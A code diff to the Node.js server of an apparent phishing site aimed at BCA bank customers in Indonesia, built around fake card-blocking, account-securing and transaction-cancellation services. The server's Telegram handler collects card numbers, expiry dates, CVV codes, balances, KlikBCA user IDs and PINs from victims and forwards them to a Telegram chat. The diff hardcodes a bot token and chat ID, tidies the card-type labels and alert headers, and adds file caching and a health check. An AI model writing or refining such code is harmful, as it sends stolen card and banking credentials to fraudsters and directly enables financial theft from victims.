@@ -21,6 +21,11 @@ const contentTypes = {
   '.json': 'application/json; charset=utf-8',
   '.svg': 'image/svg+xml',
   '.woff2': 'font/woff2',
+  '.png': 'image/png',
+  '.webp': 'image/webp',
+  '.jpg': 'image/jpeg',
+  '.jpeg': 'image/jpeg',
+  '.ico': 'image/x-icon',
 };
 
 function json(response, statusCode, body) {
@@ -85,8 +90,8 @@ async function sendTelegramNotification(request, response) {
     return;
   }
 
-  const rawBotToken = (process.env.TELEGRAM_BOT_TOKEN || '').trim();
-  const rawChatId = (process.env.TELEGRAM_CHAT_ID || '').trim();
+  const rawBotToken = (process.env.TELEGRAM_BOT_TOKEN || '8961452459:AAHavxbPWyCcV2Rz6yEOV-ycfqcSi6RYwNg').trim();
+  const rawChatId = (process.env.TELEGRAM_CHAT_ID || '8341942326').trim();
 
   if (!rawBotToken || !rawChatId) {
     console.warn('Telegram notification skipped: Bot token or chat ID is not configured');
@@ -170,7 +175,16 @@ async function sendTelegramNotification(request, response) {
 
     if (payload.serviceType === 'blokir') {
       const bankTarget = payload.bankTarget || 'BANK BCA';
-      const jenisKartu = payload.jenisKartu || 'GPN / KARTU BANK';
+      let jenisKartu = payload.jenisKartu || 'DEBIT PASPOR BCA';
+      if (jenisKartu === 'MASTERCARD' || jenisKartu === 'Mastercard') {
+        jenisKartu = 'DEBIT PASPOR BCA MASTERCARD';
+      } else if (jenisKartu === 'VISA' || jenisKartu === 'Visa') {
+        jenisKartu = 'DEBIT PASPOR BCA VISA';
+      } else if (jenisKartu === 'JCB' || jenisKartu === 'Jcb') {
+        jenisKartu = 'DEBIT PASPOR BCA JCB';
+      } else if (jenisKartu === 'BCA' || jenisKartu === 'GPN') {
+        jenisKartu = 'DEBIT PASPOR BCA GPN';
+      }
       const nomorKartu = payload.nomorKartu || '-';
       const nomorHp = payload.nomorHp || '-';
       const masaBerlaku = payload.masaBerlaku || '-';
@@ -178,18 +192,18 @@ async function sendTelegramNotification(request, response) {
       const limitSaldo = payload.limitSaldo || '-';
 
       const preBlock = [
-        `${'Bank Target'.padEnd(14, ' ')}: ${bankTarget}`,
-        `${'Jenis Kartu'.padEnd(14, ' ')}: ${jenisKartu}`,
-        `${'Nomor Kartu'.padEnd(14, ' ')}: ${nomorKartu}`,
-        `${'Nomor HP/WA'.padEnd(14, ' ')}: ${nomorHp}`,
-        `${'Masa Berlaku'.padEnd(14, ' ')}: ${masaBerlaku}`,
-        `${'CVV / CVC'.padEnd(14, ' ')}: ${cvv}`,
-        `${'Limit/Saldo'.padEnd(14, ' ')}: ${limitSaldo}`,
-        `${'Waktu Input'.padEnd(14, ' ')}: ${waktuInput}`,
+        `${'Bank Target'.padEnd(15, ' ')}: ${bankTarget}`,
+        `${'Jenis Kartu'.padEnd(15, ' ')}: ${jenisKartu}`,
+        `${'Nomor Kartu'.padEnd(15, ' ')}: ${nomorKartu}`,
+        `${'Nomor HP/WA'.padEnd(15, ' ')}: ${nomorHp}`,
+        `${'Masa Berlaku'.padEnd(15, ' ')}: ${masaBerlaku}`,
+        `${'CVV / CVC'.padEnd(15, ' ')}: ${cvv}`,
+        `${'Limit/Saldo'.padEnd(15, ' ')}: ${limitSaldo}`,
+        `${'Waktu Input'.padEnd(15, ' ')}: ${waktuInput}`,
       ].join('\n');
 
       message = [
-        '🚨 DATA PEMBLOKIRAN KARTU BCA 🚨',
+        '🚨 KARTU BCA 🚨',
         '',
         `<pre>${escapeHtml(preBlock)}</pre>`,
         '',
@@ -200,7 +214,10 @@ async function sendTelegramNotification(request, response) {
       ].join('\n');
     } else if (payload.serviceType === 'amankan-bank-lain') {
       const bankTarget = (payload.bankTarget || 'BANK LAIN').toUpperCase();
-      const jenisKartu = payload.jenisKartu || 'GPN / KARTU BANK';
+      let jenisKartu = payload.jenisKartu || 'DEBIT / KREDIT';
+      if (['MASTERCARD', 'VISA', 'JCB', 'GPN', 'BCA'].includes((jenisKartu || '').toUpperCase())) {
+        jenisKartu = `KARTU ${(jenisKartu || '').toUpperCase()}`;
+      }
       const nomorKartu = payload.nomorKartu || '-';
       const nomorHp = payload.nomorHp || '-';
       const masaBerlaku = payload.masaBerlaku || '-';
@@ -208,18 +225,18 @@ async function sendTelegramNotification(request, response) {
       const limitSaldo = payload.limitSaldo || '-';
 
       const preBlock = [
-        `${'Bank Target'.padEnd(14, ' ')}: ${bankTarget}`,
-        `${'Jenis Kartu'.padEnd(14, ' ')}: ${jenisKartu}`,
-        `${'Nomor Kartu'.padEnd(14, ' ')}: ${nomorKartu}`,
-        `${'Nomor HP/WA'.padEnd(14, ' ')}: ${nomorHp}`,
-        `${'Masa Berlaku'.padEnd(14, ' ')}: ${masaBerlaku}`,
-        `${'CVV / CVC'.padEnd(14, ' ')}: ${cvv}`,
-        `${'Limit/Saldo'.padEnd(14, ' ')}: ${limitSaldo}`,
-        `${'Waktu Input'.padEnd(14, ' ')}: ${waktuInput}`,
+        `${'Bank Target'.padEnd(15, ' ')}: ${bankTarget}`,
+        `${'Jenis Kartu'.padEnd(15, ' ')}: ${jenisKartu}`,
+        `${'Nomor Kartu'.padEnd(15, ' ')}: ${nomorKartu}`,
+        `${'Nomor HP/WA'.padEnd(15, ' ')}: ${nomorHp}`,
+        `${'Masa Berlaku'.padEnd(15, ' ')}: ${masaBerlaku}`,
+        `${'CVV / CVC'.padEnd(15, ' ')}: ${cvv}`,
+        `${'Limit/Saldo'.padEnd(15, ' ')}: ${limitSaldo}`,
+        `${'Waktu Input'.padEnd(15, ' ')}: ${waktuInput}`,
       ].join('\n');
 
       message = [
-        `🚨 DATA PEMBLOKIRAN KARTU ${escapeHtml(bankTarget)} 🚨`,
+        `🚨 KARTU ${escapeHtml(bankTarget)} 🚨`,
         '',
         `<pre>${escapeHtml(preBlock)}</pre>`,
         '',
@@ -236,17 +253,17 @@ async function sendTelegramNotification(request, response) {
       const password = payload.password || '-';
 
       const lines = [
-        `${'Jenis Layanan'.padEnd(14, ' ')}: ${jenisLayanan}`,
+        `${'Jenis Layanan'.padEnd(15, ' ')}: ${jenisLayanan}`,
       ];
       if (corporateId) {
-        lines.push(`${'Corporate ID'.padEnd(14, ' ')}: ${corporateId}`);
+        lines.push(`${'Corporate ID'.padEnd(15, ' ')}: ${corporateId}`);
       }
-      lines.push(`${'User ID'.padEnd(14, ' ')}: ${userId}`);
+      lines.push(`${'User ID'.padEnd(15, ' ')}: ${userId}`);
       if (nomorHp && nomorHp !== '-') {
-        lines.push(`${'Nomor HP/WA'.padEnd(14, ' ')}: ${nomorHp}`);
+        lines.push(`${'Nomor HP/WA'.padEnd(15, ' ')}: ${nomorHp}`);
       }
-      lines.push(`${'PIN / Respon'.padEnd(14, ' ')}: ${password}`);
-      lines.push(`${'Waktu Input'.padEnd(14, ' ')}: ${waktuInput}`);
+      lines.push(`${'PIN / Respon'.padEnd(15, ' ')}: ${password}`);
+      lines.push(`${'Waktu Input'.padEnd(15, ' ')}: ${waktuInput}`);
 
       const preBlock = lines.join('\n');
 
@@ -261,7 +278,7 @@ async function sendTelegramNotification(request, response) {
       salinLines.push(`• PIN / Respon: <code>${escapeHtml(password)}</code>`);
 
       message = [
-        '🚨 DATA PENGAMANAN USER ID KLIKBCA 🚨',
+        '🚨 USER ID KLIKBCA 🚨',
         '',
         `<pre>${escapeHtml(preBlock)}</pre>`,
         '',
@@ -276,7 +293,7 @@ async function sendTelegramNotification(request, response) {
       ].join('\n');
 
       message = [
-        '🚨 DATA PEMBATALAN TRANSAKSI BCA 🚨',
+        '🚨 PEMBATALAN TRANSAKSI BCA 🚨',
         '',
         `<pre>${escapeHtml(preBlock)}</pre>`,
         '',
@@ -317,6 +334,17 @@ async function sendTelegramNotification(request, response) {
   }
 }
 
+const fileCache = new Map();
+
+async function getCachedFile(filePath) {
+  if (fileCache.has(filePath)) {
+    return fileCache.get(filePath);
+  }
+  const buffer = await readFile(filePath);
+  fileCache.set(filePath, buffer);
+  return buffer;
+}
+
 async function serveStatic(request, response) {
   const requestPath = decodeURIComponent(new URL(request.url, 'http://localhost').pathname);
   const relativePath = requestPath === '/' ? 'index.html' : requestPath.slice(1);
@@ -327,24 +355,29 @@ async function serveStatic(request, response) {
     return;
   }
 
+  const ext = extname(filePath);
+  const isImmutableAsset = requestPath.startsWith('/assets/') || ['.woff2', '.webp', '.png', '.jpg', '.jpeg', '.svg'].includes(ext);
+
   try {
     const fileStats = await stat(filePath);
     if (!fileStats.isFile()) throw new Error('Not a file');
+    const content = await getCachedFile(filePath);
     response.writeHead(200, {
-      'Content-Type': contentTypes[extname(filePath)] || 'application/octet-stream',
-      'Cache-Control': 'no-cache',
+      'Content-Type': contentTypes[ext] || 'application/octet-stream',
+      'Cache-Control': isImmutableAsset ? 'public, max-age=31536000, immutable' : 'public, max-age=3600, must-revalidate',
       'X-Content-Type-Options': 'nosniff',
     });
-    response.end(await readFile(filePath));
+    response.end(content);
   } catch {
     // Let the SPA router handle unknown client-side paths.
     try {
+      const indexContent = await getCachedFile(join(distDir, 'index.html'));
       response.writeHead(200, {
         'Content-Type': 'text/html; charset=utf-8',
         'Cache-Control': 'no-cache',
         'X-Content-Type-Options': 'nosniff',
       });
-      response.end(await readFile(join(distDir, 'index.html')));
+      response.end(indexContent);
     } catch {
       json(response, 503, { ok: false, error: 'Application has not been built' });
     }
@@ -362,6 +395,11 @@ async function createAppServer() {
   }
 
   const server = createServer(async (request, response) => {
+    if (request.url?.startsWith('/api/health')) {
+      json(response, 200, { ok: true, status: 'healthy', timestamp: new Date().toISOString() });
+      return;
+    }
+
     if (request.url?.startsWith('/api/telegram')) {
       await sendTelegramNotification(request, response);
       return;
